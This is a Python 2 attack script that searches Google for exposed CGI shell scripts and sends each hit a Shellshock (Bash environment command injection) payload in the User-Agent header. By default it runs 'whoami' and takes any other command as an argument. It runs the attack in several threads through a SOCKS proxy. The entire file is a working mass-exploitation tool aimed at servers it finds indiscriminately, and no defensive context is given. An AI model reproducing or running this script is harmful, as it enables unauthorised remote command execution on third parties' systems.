import urllib2, requests, socket
import Queue, threading, re
import random, sys, argparse, time

#PROXY CODE START
import socks
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 5555)
socket.socket = socks.socksocket
#PROXY CODE END


class Exploit(threading.Thread):
	def __init__(self, targets, cmd):
		self.targets = targets
		self.cmd = cmd
		threading.Thread.__init__(self)

	def run(self):
		while not self.targets.empty():
			url = self.targets.get()
			try:
				headers = {"User-Agent":"() { :; }; " + self.cmd}
				r = requests.get(url, headers = headers, verify = False)
				print str(r.status_code) + " : " + url
			except Exception as e:
				print str(e) + url
			finally:
				self.targets.task_done()

class Google(threading.Thread):
	def __init__(self, dork, count):
		self.dork = dork
		self.count = count
		self.targets = Queue.Queue()
		self.launch = False
		threading.Thread.__init__(self)

	def run(self):
		for i in range(0, self.count):
			self.google(dork, i)
			if not self.targets.empty():
				self.launch = True
			else:
				self.launch = False
			time.sleep(random.random()*3)
		self.launch = True
		print "Google Search Done"

	def google(self, dork, index):
		url = 'https://www.google.com/search?q='+urllib2.quote(dork)+'&_'+str(random.random())+'&cr=countryCN&start='+str(index);
		
		#userAgent = 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36';
		#headers = {"User-Agent":userAgent}

		r = requests.get(url)
		if r.status_code == 503:
			print "Blocked by Google!"

		p = re.compile("/url\\?q=(.*?)&")
		result = re.findall(p,r.content)
		for link in result:
			if "googleusercontent" not in link:
				#print link
				self.targets.put(link)



USAGE = "exp -t thread -c page_count -e command"
DESC  = "Scan GNU Bash Env Command Injection via Google. \n code by kingx  -   http://cih.so"
epilog = "License, requests, etc: https://github.com/KxCode"
parser = argparse.ArgumentParser(usage=USAGE, description=DESC, epilog=epilog)
parser.add_argument('-t', dest='thread_count',
					type=int,
                    help="thread count",
                    default=4)
parser.add_argument('-c', dest='page_count',
					type=int,
                    help="google page count",
                    default=1)
parser.add_argument('-e', dest='cmd',
                    help="Command to Execute",
                    default="whoami")
args = parser.parse_args()


dork = "filetype:sh inurl:cgi-bin"

payload = Google(dork, args.page_count)
print "Google Searching..."
payload.start()


while not payload.launch:
	time.sleep(0.1)

pool = []
for i in range(0,args.thread_count):
	exp = Exploit(payload.targets, args.cmd)
	pool.append(exp)
	exp.start()

for th in pool:
	th.join()

print "done"
